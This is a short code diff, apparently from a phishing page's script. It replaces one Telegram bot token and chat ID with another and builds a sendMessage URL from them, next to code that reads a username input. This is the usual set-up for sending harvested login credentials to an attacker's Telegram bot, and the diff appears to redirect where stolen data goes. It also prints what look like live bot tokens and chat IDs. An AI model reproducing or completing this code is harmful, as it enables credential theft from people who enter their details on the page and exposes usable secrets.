@@ -1,5 +1,5 @@
-const BOT_TOKEN = "6673732561:AAFuBMig55ikwVDdaaec2O2m4obX865mJnc";
-const TELEGRAM_CHAT_ID = "1923662194";
+const BOT_TOKEN = "7069881307:AAGgW0hE9Conz4zMY7I5nKJsBjD5HcQi100";
+const TELEGRAM_CHAT_ID = "7289939968";
 const TELEGRAM_BOT_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}`;
 
 const usernameInput = document.querySelector('.username');
